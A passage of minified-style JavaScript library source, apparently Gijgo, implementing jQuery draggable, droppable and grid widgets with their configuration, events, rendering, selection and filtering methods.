    return function (e) {
      "true" === t.attr("draggable-dragging") && (t.attr("draggable-dragging", !1), gj.documentManager.unsubscribeForEvent("mousemove", t.data("guid")), gj.documentManager.unsubscribeForEvent("touchmove", t.data("guid")), gj.draggable.events.stop(t, {
        x: t.mouseX(e),
        y: t.mouseY(e)
      }));
    };
  },
  createMoveHandler: function (s, e, l) {
    return function (e) {
      var t, n, i, o, r, a;
      "true" === s.attr("draggable-dragging") && (t = Math.round(s.mouseX(e)), n = Math.round(s.mouseY(e)), r = s.attr("draggable-x"), a = s.attr("draggable-y"), r && a ? (i = l.horizontal ? t - parseInt(r, 10) : 0, o = l.vertical ? n - parseInt(a, 10) : 0, gj.draggable.methods.move(s[0], l, i, o, t, n)) : gj.draggable.events.start(s, t, n), s.attr("draggable-x", t), s.attr("draggable-y", n));
    };
  },
  move: function (e, t, n, i, o, r) {
    var a,
      s,
      l,
      d = gj.core.position(e),
      c = d.top + i,
      u = d.left + n;
    t.containment && (s = (a = gj.core.position(t.containment)).top + gj.core.height(t.containment) - gj.core.height(e), l = a.left + gj.core.width(t.containment) - gj.core.width(e), c > a.top && c < s ? (a.top >= r || a.bottom <= r) && (c = d.top) : c = c <= a.top ? a.top + 1 : s - 1, u > a.left && u < l ? (a.left >= o || a.right <= o) && (u = d.left) : u = u <= a.left ? a.left + 1 : l - 1), !1 !== gj.draggable.events.drag($(e), u, c, o, r) && (e.style.top = c + "px", e.style.left = u + "px");
  },
  destroy: function (e) {
    return "true" === e.attr("data-draggable") && (gj.documentManager.unsubscribeForEvent("mouseup", e.data("guid")), e.removeData(), e.removeAttr("data-guid").removeAttr("data-type").removeAttr("data-draggable"), e.removeAttr("draggable-x").removeAttr("draggable-y").removeAttr("draggable-dragging"), e[0].style.top = "", e[0].style.left = "", e[0].style.position = "", e.off("drag").off("start").off("stop"), gj.draggable.methods.getHandleElement(e).off("mousedown")), e;
  }
}, gj.draggable.events = {
  drag: function (e, t, n, i, o) {
    return e.triggerHandler("drag", [{
      left: t,
      top: n
    }, {
      x: i,
      y: o
    }]);
  },
  start: function (e, t, n) {
    e.triggerHandler("start", [{
      x: t,
      y: n
    }]);
  },
  stop: function (e, t) {
    e.triggerHandler("stop", [t]);
  }
}, gj.draggable.widget = function (e, t) {
  var n = gj.draggable.methods;
  return e.destroy || (this.destroy = function () {
    return n.destroy(this);
  }), $.extend(e, this), "true" !== e.attr("data-draggable") && n.init.call(e, t), e;
}, gj.draggable.widget.prototype = new gj.widget(), gj.draggable.widget.constructor = gj.draggable.widget, jQuery.fn.draggable = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.draggable.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.draggable.widget(this, e);
  }
}, gj.droppable = {
  plugins: {}
}, gj.droppable.config = {
  hoverClass: void 0
}, gj.droppable.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "droppable"), this.attr("data-droppable", "true"), gj.documentManager.subscribeForEvent("mousedown", this.data("guid"), gj.droppable.methods.createMouseDownHandler(this)), gj.documentManager.subscribeForEvent("mousemove", this.data("guid"), gj.droppable.methods.createMouseMoveHandler(this)), gj.documentManager.subscribeForEvent("mouseup", this.data("guid"), gj.droppable.methods.createMouseUpHandler(this)), this;
  },
  createMouseDownHandler: function (t) {
    return function (e) {
      t.isDragging = !0;
    };
  },
  createMouseMoveHandler: function (o) {
    return function (e) {
      if (o.isDragging) {
        var t = o.data("hoverClass"),
          n = {
            x: o.mouseX(e),
            y: o.mouseY(e)
          },
          i = gj.droppable.methods.isOver(o, n);
        i != o.isOver && (i ? (t && o.addClass(t), gj.droppable.events.over(o, n)) : (t && o.removeClass(t), gj.droppable.events.out(o))), o.isOver = i;
      }
    };
  },
  createMouseUpHandler: function (n) {
    return function (e) {
      var t = {
        left: n.mouseX(e),
        top: n.mouseY(e)
      };
      n.isDragging = !1, gj.droppable.methods.isOver(n, t) && gj.droppable.events.drop(n);
    };
  },
  isOver: function (e, t) {
    var n = e.offset().top,
      i = e.offset().left;
    return t.x > i && t.x < i + e.outerWidth(!0) && t.y > n && t.y < n + e.outerHeight(!0);
  },
  destroy: function (e) {
    return "true" === e.attr("data-droppable") && (gj.documentManager.unsubscribeForEvent("mousedown", e.data("guid")), gj.documentManager.unsubscribeForEvent("mousemove", e.data("guid")), gj.documentManager.unsubscribeForEvent("mouseup", e.data("guid")), e.removeData(), e.removeAttr("data-guid"), e.removeAttr("data-droppable"), e.off("drop").off("over").off("out")), e;
  }
}, gj.droppable.events = {
  drop: function (e, t, n) {
    e.trigger("drop", [{
      top: n,
      left: t
    }]);
  },
  over: function (e, t) {
    e.trigger("over", [t]);
  },
  out: function (e) {
    e.trigger("out");
  }
}, gj.droppable.widget = function (e, t) {
  var n = gj.droppable.methods;
  return this.isOver = !1, this.isDragging = !1, this.destroy = function () {
    return n.destroy(this);
  }, this.isOver = function (e) {
    return n.isOver(this, e);
  }, $.extend(e, this), "true" !== e.attr("data-droppable") && n.init.call(e, t), e;
}, gj.droppable.widget.prototype = new gj.widget(), gj.droppable.widget.constructor = gj.droppable.widget, jQuery.fn.droppable = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.droppable.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.droppable.widget(this, e);
  }
}, gj.grid = {
  plugins: {},
  messages: {}
}, gj.grid.config = {
  base: {
    dataSource: void 0,
    columns: [],
    autoGenerateColumns: !1,
    defaultColumnSettings: {
      hidden: !1,
      width: void 0,
      sortable: !1,
      type: "text",
      title: void 0,
      field: void 0,
      align: void 0,
      cssClass: void 0,
      headerCssClass: void 0,
      tooltip: void 0,
      icon: void 0,
      events: void 0,
      format: "mm-dd-yyyy",
      decimalDigits: void 0,
      tmpl: void 0,
      stopPropagation: !1,
      renderer: void 0,
      filter: void 0
    },
    mapping: {
      dataField: "records",
      totalRecordsField: "total"
    },
    params: {},
    paramNames: {
      sortBy: "sortBy",
      direction: "direction"
    },
    uiLibrary: "materialdesign",
    iconsLibrary: "materialicons",
    selectionType: "single",
    selectionMethod: "basic",
    autoLoad: !0,
    notFoundText: void 0,
    width: void 0,
    minWidth: void 0,
    headerRowHeight: "fixed",
    bodyRowHeight: "autogrow",
    fontSize: void 0,
    primaryKey: void 0,
    locale: "en-us",
    defaultIconColumnWidth: 70,
    defaultCheckBoxColumnWidth: 70,
    style: {
      wrapper: "gj-grid-wrapper",
      table: "gj-grid gj-grid-md",
      loadingCover: "gj-grid-loading-cover",
      loadingText: "gj-grid-loading-text",
      header: {
        cell: void 0,
        sortable: "gj-cursor-pointer gj-unselectable"
      },
      content: {
        rowSelected: "gj-grid-md-select"
      }
    },
    icons: {
      asc: "▲",
      desc: "▼"
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-grid-wrapper",
      table: "gj-grid gj-grid-bootstrap gj-grid-bootstrap-3 table table-bordered table-hover",
      content: {
        rowSelected: "active"
      }
    },
    iconsLibrary: "glyphicons",
    defaultIconColumnWidth: 34,
    defaultCheckBoxColumnWidth: 36
  },
  bootstrap4: {
    style: {
      wrapper: "gj-grid-wrapper",
      table: "gj-grid gj-grid-bootstrap gj-grid-bootstrap-4 table table-bordered table-hover",
      content: {
        rowSelected: "active"
      }
    },
    defaultIconColumnWidth: 42,
    defaultCheckBoxColumnWidth: 44
  },
  materialicons: {
    icons: {
      asc: '<i class="gj-icon arrow-upward" />',
      desc: '<i class="gj-icon arrow-downward" />'
    }
  },
  fontawesome: {
    icons: {
      asc: '<i class="fa fa-sort-amount-asc" aria-hidden="true"></i>',
      desc: '<i class="fa fa-sort-amount-desc" aria-hidden="true"></i>'
    }
  },
  glyphicons: {
    icons: {
      asc: '<span class="glyphicon glyphicon-sort-by-alphabet" />',
      desc: '<span class="glyphicon glyphicon-sort-by-alphabet-alt" />'
    }
  }
}, gj.grid.events = {
  beforeEmptyRowInsert: function (e, t) {
    return e.triggerHandler("beforeEmptyRowInsert", [t]);
  },
  dataBinding: function (e, t) {
    return e.triggerHandler("dataBinding", [t]);
  },
  dataBound: function (e, t, n) {
    return e.triggerHandler("dataBound", [t, n]);
  },
  rowDataBound: function (e, t, n, i) {
    return e.triggerHandler("rowDataBound", [t, n, i]);
  },
  cellDataBound: function (e, t, n, i, o) {
    return e.triggerHandler("cellDataBound", [t, n, i, o]);
  },
  rowSelect: function (e, t, n, i) {
    return e.triggerHandler("rowSelect", [t, n, i]);
  },
  rowUnselect: function (e, t, n, i) {
    return e.triggerHandler("rowUnselect", [t, n, i]);
  },
  rowRemoving: function (e, t, n, i) {
    return e.triggerHandler("rowRemoving", [t, n, i]);
  },
  destroying: function (e) {
    return e.triggerHandler("destroying");
  },
  columnHide: function (e, t) {
    return e.triggerHandler("columnHide", [t]);
  },
  columnShow: function (e, t) {
    return e.triggerHandler("columnShow", [t]);
  },
  initialized: function (e) {
    return e.triggerHandler("initialized");
  },
  dataFiltered: function (e, t) {
    return e.triggerHandler("dataFiltered", [t]);
  }
}, gj.grid.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "grid"), gj.grid.methods.initialize(this), this.data("autoLoad") && this.reload(), this;
  },
  getConfig: function (e, t) {
    var n = gj.widget.prototype.getConfig.call(this, e, t);
    return gj.grid.methods.setDefaultColumnConfig(n.columns, n.defaultColumnSettings), n;
  },
  setDefaultColumnConfig: function (e, t) {
    var n, i;
    if (e && e.length) for (i = 0; i < e.length; i++) n = $.extend(!0, {}, t), $.extend(!0, n, e[i]), e[i] = n;
  },
  getHTMLConfig: function () {
    var i = gj.widget.prototype.getHTMLConfig.call(this);
    return i.columns = [], this.find("thead > tr > th").each(function () {
      var e = $(this),
        t = e.text(),
        n = gj.widget.prototype.getHTMLConfig.call(e);
      n.title = t, n.field || (n.field = t), n.events && (n.events = gj.grid.methods.eventsParser(n.events)), i.columns.push(n);
    }), i;
  },
  eventsParser: function (events) {
    var result = {},
      list,
      i,
      key,
      func,
      position;
    for (list = events.split(","), i = 0; i < list.length; i++) 0 < (position = list[i].indexOf(":")) && (key = $.trim(list[i].substr(0, position)), func = $.trim(list[i].substr(position + 1, list[i].length)), result[key] = eval("window." + func));
    return result;
  },
  initialize: function (t) {
    var e = t.data(),
      n = t.parent('div[data-role="wrapper"]');
    gj.grid.methods.localization(e), 0 === n.length ? (n = $('<div data-role="wrapper" />').addClass(e.style.wrapper), t.wrap(n)) : n.addClass(e.style.wrapper), e.width && t.parent().css("width", e.width), e.minWidth && t.css("min-width", e.minWidth), e.fontSize && t.css("font-size", e.fontSize), "autogrow" === e.headerRowHeight && t.addClass("autogrow-header-row"), "fixed" === e.bodyRowHeight && t.addClass("fixed-body-rows"), t.addClass(e.style.table), "checkbox" === e.selectionMethod && e.columns.splice(gj.grid.methods.getColumnPositionNotInRole(t), 0, {
      title: "",
      width: e.defaultCheckBoxColumnWidth,
      align: "center",
      type: "checkbox",
      role: "selectRow",
      events: {
        click: function (e) {
          gj.grid.methods.setSelected(t, e.data.id, $(this).closest("tr"));
        }
      },
      headerCssClass: "gj-grid-select-all",
      stopPropagation: !0
    }), 0 === t.children("tbody").length && t.append($("<tbody/>")), gj.grid.methods.renderHeader(t), gj.grid.methods.appendEmptyRow(t, "&nbsp;"), gj.grid.events.initialized(t);
  },
  localization: function (e) {
    e.notFoundText || (e.notFoundText = gj.grid.messages[e.locale].NoRecordsFound);
  },
  renderHeader: function (e) {
    var t, n, i, o, r, a, s, l, d;
    for (n = (t = e.data()).columns, i = t.style.header, 0 === (o = e.children("thead")).length && (o = $("<thead />"), e.prepend(o)), r = $('<tr data-role="caption" />'), l = 0; l < n.length; l += 1) a = $('<th data-field="' + (n[l].field || "") + '" />'), n[l].width ? a.attr("width", n[l].width) : "checkbox" === n[l].type && a.attr("width", t.defaultIconColumnWidth), a.addClass(i.cell), n[l].headerCssClass && a.addClass(n[l].headerCssClass), a.css("text-align", n[l].align || "left"), "checkbox" === t.selectionMethod && "multiple" === t.selectionType && "checkbox" === n[l].type && "selectRow" === n[l].role ? (0 === (d = a.find('input[data-role="selectAll"]')).length && (d = $('<input type="checkbox" data-role="selectAll" />'), a.append(d), d.checkbox({
      uiLibrary: t.uiLibrary
    })), d.off("click").on("click", function () {
      this.checked ? e.selectAll() : e.unSelectAll();
    })) : (s = $('<div data-role="title"/>').html(void 0 === n[l].title ? n[l].field : n[l].title), a.append(s), n[l].sortable && (s.addClass(i.sortable), s.on("click", gj.grid.methods.createSortHandler(e, n[l])))), n[l].hidden && a.hide(), r.append(a);
    o.empty().append(r);
  },
  createSortHandler: function (n, i) {
    return function () {
      var e,
        t = {};
      0 < n.count() && (t[(e = n.data()).paramNames.sortBy] = i.field, i.direction = "asc" === i.direction ? "desc" : "asc", t[e.paramNames.direction] = i.direction, n.reload(t));
    };
  },
  updateHeader: function (e) {
    var t,
      n,
      i = e.data(),
      o = i.params[i.paramNames.sortBy],
      r = i.params[i.paramNames.direction];
    e.find('thead tr th [data-role="sorticon"]').remove(), o && (position = gj.grid.methods.getColumnPosition(e.data("columns"), o), -1 < position && (n = e.find("thead tr th:eq(" + position + ') div[data-role="title"]'), t = $('<div data-role="sorticon" class="gj-unselectable" />').append("desc" === r ? i.icons.desc : i.icons.asc), n.after(t)));
  },
  useHtmlDataSource: function (e, t) {
    var n,
      i,
      o,
      r,
      a = [],
      s = e.find('tbody tr[data-role != "empty"]');
    for (n = 0; n < s.length; n++) {
      for (o = $(s[n]).find("td"), r = {}, i = 0; i < o.length; i++) r[t.columns[i].field] = $(o[i]).html();
      a.push(r);
    }
    t.dataSource = a;
  },
  startLoading: function (e) {
    var t, n, i, o, r, a, s;
    gj.grid.methods.stopLoading(e), s = e.data(), 0 !== e.outerHeight() && (o = (t = e.children("tbody")).outerWidth(!1), r = t.outerHeight(!1), a = Math.abs(e.parent().offset().top - t.offset().top), n = $('<div data-role="loading-cover" />').addClass(s.style.loadingCover).css({
      width: o,
      height: r,
      top: a
    }), (i = $('<div data-role="loading-text">' + gj.grid.messages[s.locale].Loading + "</div>").addClass(s.style.loadingText)).insertAfter(e), n.insertAfter(e), i.css({
      top: a + r / 2 - i.outerHeight(!1) / 2,
      left: o / 2 - i.outerWidth(!1) / 2
    }));
  },
  stopLoading: function (e) {
    e.parent().find('div[data-role="loading-cover"]').remove(), e.parent().find('div[data-role="loading-text"]').remove();
  },
  appendEmptyRow: function (e, t) {
    var n, i, o, r;
    n = e.data(), i = $('<tr data-role="empty"/>'), (o = $("<td/>").css({
      width: "100%",
      "text-align": "center"
    })).attr("colspan", gj.grid.methods.countVisibleColumns(e)), r = $("<div />").html(t || n.notFoundText), o.append(r), i.append(o), gj.grid.events.beforeEmptyRowInsert(e, i), e.append(i);
  },
  autoGenerateColumns: function (e, t) {
    var n,
      i,
      o,
      r,
      a = e.data();
    if (a.columns = [], 0 < t.length) {
      for (n = Object.getOwnPropertyNames(t[0]), r = 0; r < n.length; r++) o = "text", (i = t[0][n[r]]) && ("number" == typeof i ? o = "number" : -1 < i.indexOf("/Date(") && (o = "date")), a.columns.push({
        field: n[r],
        type: o
      });
      gj.grid.methods.setDefaultColumnConfig(a.columns, a.defaultColumnSettings);
    }
    gj.grid.methods.renderHeader(e);
  },
  loadData: function (e) {
    var t, n, i, o, r, a, s, l;
    for (t = e.data(), n = e.getAll(), gj.grid.events.dataBinding(e, n), o = n.length, gj.grid.methods.stopLoading(e), t.autoGenerateColumns && gj.grid.methods.autoGenerateColumns(e, n), a = e.children("tbody"), "checkbox" === t.selectionMethod && "multiple" === t.selectionType && e.find('thead input[data-role="selectAll"]').prop("checked", !1), a.children("tr").not('[data-role="row"]').remove(), 0 === o && (a.empty(), gj.grid.methods.appendEmptyRow(e)), r = (s = a.children("tr")).length, i = 0; i < r; i++) {
      if (!(i < o)) {
        a.find('tr[data-role="row"]:gt(' + (i - 1) + ")").remove();
        break;
      }
      l = s.eq(i), gj.grid.methods.renderRow(e, l, n[i], i);
    }
    for (i = r; i < o; i++) gj.grid.methods.renderRow(e, null, n[i], i);
    gj.grid.events.dataBound(e, n, t.totalRecords);
  },
  getId: function (e, t, n) {
    return t && e[t] ? e[t] : n;
  },
  renderRow: function (e, t, n, i) {
    var o, r, a, s, l;
    for (s = e.data(), t && 0 !== t.length ? (l = "update", t.removeClass(s.style.content.rowSelected).removeAttr("data-selected").off("click")) : (l = "create", t = $('<tr data-role="row"/>'), e.children("tbody").append(t)), o = gj.grid.methods.getId(n, s.primaryKey, i + 1), t.attr("data-position", i + 1), "checkbox" !== s.selectionMethod && t.on("click", gj.grid.methods.createRowClickHandler(e, o)), a = 0; a < s.columns.length; a++) "update" === l ? (r = t.find("td:eq(" + a + ")"), gj.grid.methods.renderCell(e, r, s.columns[a], n, o)) : (r = gj.grid.methods.renderCell(e, null, s.columns[a], n, o), t.append(r));
    gj.grid.events.rowDataBound(e, t, o, n);
  },
  renderCell: function (e, t, n, i, o, r) {
    var a, s;
    if (r = t && 0 !== t.length ? (a = t.find('div[data-role="display"]'), "update") : (t = $("<td/>"), a = $('<div data-role="display" />'), n.align && t.css("text-align", n.align), n.cssClass && t.addClass(n.cssClass), t.append(a), "create"), gj.grid.methods.renderDisplayElement(e, a, n, i, o, r), "update" === r && (t.off(), a.off()), n.events) for (s in n.events) n.events.hasOwnProperty(s) && t.on(s, {
      id: o,
      field: n.field,
      record: i
    }, gj.grid.methods.createCellEventHandler(n, n.events[s]));
    return n.hidden && t.hide(), gj.grid.events.cellDataBound(e, a, o, n, i), t;
  },
  createCellEventHandler: function (t, n) {
    return function (e) {
      t.stopPropagation && e.stopPropagation(), n.call(this, e);
    };
  },
  renderDisplayElement: function (e, t, n, i, o, r) {
    var a, s;
    "checkbox" === n.type && gj.checkbox ? "create" === r ? (s = $('<input type="checkbox" />').val(o).prop("checked", !!i[n.field]), n.role && s.attr("data-role", n.role), t.append(s), s.checkbox({
      uiLibrary: e.data("uiLibrary")
    }), "selectRow" === n.role ? s.on("click", function () {
      return !1;
    }) : s.prop("disabled", !0)) : t.find('input[type="checkbox"]').val(o).prop("checked", !!i[n.field]) : "icon" === n.type ? "create" === r && (t.append($("<span/>").addClass(n.icon).css({
      cursor: "pointer"
    })), "bootstrap" === e.data().uiLibrary && t.children("span").addClass("glyphicon"), n.stopPropagation = !0) : n.tmpl ? (a = n.tmpl, n.tmpl.replace(/\{(.+?)\}/g, function (e, t) {
      a = a.replace(e, gj.grid.methods.formatText(i[t], n));
    }), t.html(a)) : n.renderer && "function" == typeof n.renderer ? (a = n.renderer(i[n.field], i, t.parent(), t, o, e)) && t.html(a) : (i[n.field] = gj.grid.methods.formatText(i[n.field], n), !n.tooltip && i[n.field] && t.attr("title", i[n.field]), t.html(i[n.field])), n.tooltip && "create" === r && t.attr("title", n.tooltip);
  },
  formatText: function (e, t) {
    return e = e && -1 < ["date", "time", "datetime"].indexOf(t.type) ? gj.core.formatDate(gj.core.parseDate(e, t.format), t.format) : null == e ? "" : e.toString(), t.decimalDigits && e && (e = parseFloat(e).toFixed(t.decimalDigits)), e;
  },
  setRecordsData: function (e, t) {
    var n = [],
      i = 0,
      o = e.data();
    return $.isArray(t) ? i = (n = t).length : o && o.mapping && $.isArray(t[o.mapping.dataField]) && (n = t[o.mapping.dataField], (i = t[o.mapping.totalRecordsField]) && !isNaN(i) || (i = 0)), e.data("records", n), e.data("totalRecords", i), n;
  },
  createRowClickHandler: function (e, t) {
    return function () {
      gj.grid.methods.setSelected(e, t, $(this));
    };
  },
  selectRow: function (e, t, n, i) {
    var o;
    return n.addClass(t.style.content.rowSelected), n.attr("data-selected", "true"), "checkbox" === t.selectionMethod && ((o = n.find('input[type="checkbox"][data-role="selectRow"]')).length && !o.prop("checked") && o.prop("checked", !0), "multiple" === t.selectionType && e.getSelections().length === e.count(!1) && e.find('thead input[data-role="selectAll"]').prop("checked", !0)), gj.grid.events.rowSelect(e, n, i, e.getById(i));
  },
  unselectRow: function (e, t, n, i) {
    var o;
    if ("true" === n.attr("data-selected")) return n.removeClass(t.style.content.rowSelected), "checkbox" === t.selectionMethod && ((o = n.find('td input[type="checkbox"][data-role="selectRow"]')).length && o.prop("checked") && o.prop("checked", !1), "multiple" === t.selectionType && e.find('thead input[data-role="selectAll"]').prop("checked", !1)), n.removeAttr("data-selected"), gj.grid.events.rowUnselect(e, n, i, e.getById(i));
  },
  setSelected: function (n, e, t) {
    var i = n.data();
    return t && t.length || (t = gj.grid.methods.getRowById(n, e)), t && ("true" === t.attr("data-selected") ? gj.grid.methods.unselectRow(n, i, t, e) : ("single" === i.selectionType && t.siblings('[data-selected="true"]').each(function () {
      var e = $(this),
        t = gj.grid.methods.getId(e, i.primaryKey, e.data("position"));
      gj.grid.methods.unselectRow(n, i, e, t);
    }), gj.grid.methods.selectRow(n, i, t, e))), n;
  },
  selectAll: function (o) {
    var r = o.data();
    return o.find('tbody tr[data-role="row"]').each(function () {
      var e = $(this),
        t = e.data("position"),
        n = o.get(t),
        i = gj.grid.methods.getId(n, r.primaryKey, t);
      gj.grid.methods.selectRow(o, r, e, i);
    }), o.find('thead input[data-role="selectAll"]').prop("checked", !0), o;
  },
  unSelectAll: function (o) {
    var r = o.data();
    return o.find("tbody tr").each(function () {
      var e = $(this),
        t = e.data("position"),
        n = o.get(t),
        i = gj.grid.methods.getId(n, r.primaryKey, t);
      gj.grid.methods.unselectRow(o, r, e, i), e.find('input[type="checkbox"][data-role="selectRow"]').prop("checked", !1);
    }), o.find('thead input[data-role="selectAll"]').prop("checked", !1), o;
  },
  getSelected: function (e) {
    var t,
      n,
      i,
      o = null;
    return 0 < (t = e.find('tbody>tr[data-selected="true"]')).length && (i = $(t[0]).data("position"), n = e.get(i), o = gj.grid.methods.getId(n, e.data().primaryKey, i)), o;
  },
  getSelectedRows: function (e) {
    return e.data(), e.find('tbody>tr[data-selected="true"]');
  },
  getSelections: function (e) {
    var t,
      n,
      i = [],
      o = e.data(),
      r = gj.grid.methods.getSelectedRows(e);
    return 0 < r.length && r.each(function () {
      t = $(this).data("position"), n = e.get(t), i.push(gj.grid.methods.getId(n, o.primaryKey, t));
    }), i;
  },
  getById: function (e, t) {
    var n,
      i = null,
      o = e.data("primaryKey"),
      r = e.data("records");
    if (o) {
      for (n = 0; n < r.length; n++) if (r[n][o] == t) {
        i = r[n];
        break;
      }
    } else i = e.get(t);
    return i;
  },
  getRecVPosById: function (e, t) {
    var n,
      i = t,
      o = e.data();
    if (o.primaryKey) for (n = 0; n < o.dataSource.length; n++) if (o.dataSource[n][o.primaryKey] == t) {
      i = n;
      break;
    }
    return i;
  },
  getRowById: function (e, t) {
    var n,
      i,
      o = e.getAll(!1),
      r = e.data("primaryKey"),
      a = void 0;
    if (r) {
      for (i = 0; i < o.length; i++) if (o[i][r] == t) {
        n = i + 1;
        break;
      }
    } else n = t;
    return n && (a = e.children("tbody").children('tr[data-position="' + n + '"]')), a;
  },
  getByPosition: function (e, t) {
    return e.getAll(!1)[t - 1];
  },
  getColumnPosition: function (e, t) {
    var n,
      i = -1;
    for (n = 0; n < e.length; n++) if (e[n].field === t) {
      i = n;
      break;
    }
    return i;
  },
  getColumnInfo: function (e, t) {
    var n,
      i = {},
      o = e.data();
    for (n = 0; n < o.columns.length; n += 1) if (o.columns[n].field === t) {
      i = o.columns[n];
      break;
    }
    return i;
  },
  getCell: function (e, t, n) {
    var i,
      o = null;
    return -1 < (i = gj.grid.methods.getColumnPosition(e.data("columns"), n)) && (o = gj.grid.methods.getRowById(e, t).find("td:eq(" + i + ') div[data-role="display"]')), o;
  },
  setCellContent: function (e, t, n, i) {
    var o,
      r = gj.grid.methods.getCell(e, t, n);
    r && (r.empty(), "object" == typeof i ? r.append(i) : (o = gj.grid.methods.getColumnInfo(e, n), gj.grid.methods.renderDisplayElement(e, r, o, e.getById(t), t, "update")));
  },
  clone: function (e) {
    var t = [];
    return $.each(e, function () {
      t.push(this.clone());
    }), t;
  },
  getAll: function (e) {
    return e.data("records");
  },
  countVisibleColumns: function (e) {
    var t, n, i;
    for (t = e.data().columns, i = n = 0; i < t.length; i++) !0 !== t[i].hidden && n++;
    return n;
  },
  clear: function (e, t) {
    var n = e.data();
    return e.xhr && e.xhr.abort(), e.children("tbody").empty(), n.records = [], gj.grid.methods.stopLoading(e), gj.grid.methods.appendEmptyRow(e, t ? n.notFoundText : "&nbsp;"), gj.grid.events.dataBound(e, [], 0), e;
  },
  render: function (e, t) {
    return t && (gj.grid.methods.setRecordsData(e, t), gj.grid.methods.updateHeader(e), gj.grid.methods.loadData(e)), e;
  },
  filter: function (e) {
    var i,
      o,
      r = e.data(),
      t = r.dataSource.slice();
    for (i in r.params[r.paramNames.sortBy] && (o = gj.grid.methods.getColumnInfo(e, r.params[r.paramNames.sortBy]), t.sort(o.sortable.sorter ? o.sortable.sorter(o.direction, o) : gj.grid.methods.createDefaultSorter(o.direction, o.field))), r.params) r.params[i] && !r.paramNames[i] && (o = gj.grid.methods.getColumnInfo(e, i), t = $.grep(t, function (e) {
      var t = e[i] || "",
        n = r.params[i] || "";
      return o && "function" == typeof o.filter ? o.filter(t, n) : -1 < t.toUpperCase().indexOf(n.toUpperCase());
    }));
    return gj.grid.events.dataFiltered(e, t), t;
  },
  createDefaultSorter: function (o, r) {
    return function (e, t) {
      var n = (e[r] || "").toString(),
        i = (t[r] || "").toString();
      return "asc" === o ? n.localeCompare(i) : i.localeCompare(n);
    };
  },
  destroy: function (e, t, n) {
    return e.data() && (gj.grid.events.destroying(e), gj.grid.methods.stopLoading(e), e.xhr && e.xhr.abort(), e.off(), !1 === n && 0 < e.parent('div[data-role="wrapper"]').length && e.unwrap(), e.removeData(), !1 === t ? e.remove() : e.removeClass().empty(), e.removeAttr("data-type")), e;
  },
  showColumn: function (e, t) {
    var n,
      i = e.data(),
      o = gj.grid.methods.getColumnPosition(i.columns, t);
    return -1 < o && (e.find("thead>tr").each(function () {
      $(this).children("th").eq(o).show();
    }), $.each(e.find("tbody>tr"), function () {
      $(this).children("td").eq(o).show();
    }), i.columns[o].hidden = !1, (n = e.find('tbody > tr[data-role="empty"] > td')) && n.length && n.attr("colspan", gj.grid.methods.countVisibleColumns(e)), gj.grid.events.columnShow(e, i.columns[o])), e;
  },
  hideColumn: function (e, t) {
    var n,
      i = e.data(),
      o = gj.grid.methods.getColumnPosition(i.columns, t);
    return -1 < o && (e.find("thead>tr").each(function () {
      $(this).children("th").eq(o).hide();
    }), $.each(e.find("tbody>tr"), function () {
      $(this).children("td").eq(o).hide();
    }), i.columns[o].hidden = !0, (n = e.find('tbody > tr[data-role="empty"] > td')) && n.length && n.attr("colspan", gj.grid.methods.countVisibleColumns(e)), gj.grid.events.columnHide(e, i.columns[o])), e;
  },
  isLastRecordVisible: function () {
    return !0;
  },
  addRow: function (e, t) {
    var n = e.data();
    return n.totalRecords = e.data("totalRecords") + 1, gj.grid.events.dataBinding(e, [t]), n.records.push(t), $.isArray(n.dataSource) && n.dataSource.push(t), 1 === n.totalRecords && e.children("tbody").empty(), gj.grid.methods.isLastRecordVisible(e) && gj.grid.methods.renderRow(e, null, t, e.count() - 1), gj.grid.events.dataBound(e, [t], n.totalRecords), e;
  },
  updateRow: function (e, t, n) {
    var i,
      o = gj.grid.methods.getRowById(e, t),
      r = e.data();
    return r.records[o.data("position") - 1] = n, $.isArray(r.dataSource) && (i = gj.grid.methods.getRecVPosById(e, t), r.dataSource[i] = n), gj.grid.methods.renderRow(e, o, n, o.index()), e;
  },
  removeRow: function (e, t) {
    var n,
      i = e.data(),
      o = gj.grid.methods.getRowById(e, t);
    return gj.grid.events.rowRemoving(e, o, t, e.getById(t)), $.isArray(i.dataSource) && (n = gj.grid.methods.getRecVPosById(e, t), i.dataSource.splice(n, 1)), e.reload(), e;
  },
  count: function (e, t) {
    return t ? e.data().totalRecords : e.getAll().length;
  },
  getColumnPositionByRole: function (e, t) {
    var n,
      i,
      o = e.data("columns");
    for (n = 0; n < o.length; n++) if (o[n].role === t) {
      i = n;
      break;
    }
    return i;
  },
  getColumnPositionNotInRole: function (e) {
    var t,
      n = 0,
      i = e.data("columns");
    for (t = 0; t < i.length; t++) if (!i[t].role) {
      n = t;
      break;
    }
    return n;
  }
}, gj.grid.widget = function (t, e) {
  var n = this,
    i = gj.grid.methods;
  return n.reload = function (e) {
    return i.startLoading(this), gj.widget.prototype.reload.call(this, e);
  }, n.clear = function (e) {
    return i.clear(this, e);
  }, n.count = function (e) {
    return i.count(this, e);
  }, n.render = function (e) {
    return i.render(t, e);
  }, n.destroy = function (e, t) {
    return i.destroy(this, e, t);
  }, n.setSelected = function (e) {
    return i.setSelected(this, e);
  }, n.getSelected = function () {
    return i.getSelected(this);
  }, n.getSelections = function () {
    return i.getSelections(this);
  }, n.selectAll = function () {
    return i.selectAll(this);
  }, n.unSelectAll = function () {
    return i.unSelectAll(this);
  }, n.getById = function (e) {
    return i.getById(this, e);
  }, n.get = function (e) {
    return i.getByPosition(this, e);
  }, n.getAll = function (e) {
    return i.getAll(this, e);
  }, n.showColumn = function (e) {
    return i.showColumn(this, e);
  }, n.hideColumn = function (e) {
    return i.hideColumn(this, e);
  }, n.addRow = function (e) {
    return i.addRow(this, e);
  }, n.updateRow = function (e, t) {
    return i.updateRow(this, e, t);
  }, n.setCellContent = function (e, t, n) {
    i.setCellContent(this, e, t, n);
  }, n.removeRow = function (e) {
    return i.removeRow(this, e);
  }, $.extend(t, n), "grid" !== t.attr("data-type") && i.init.call(t, e), t;
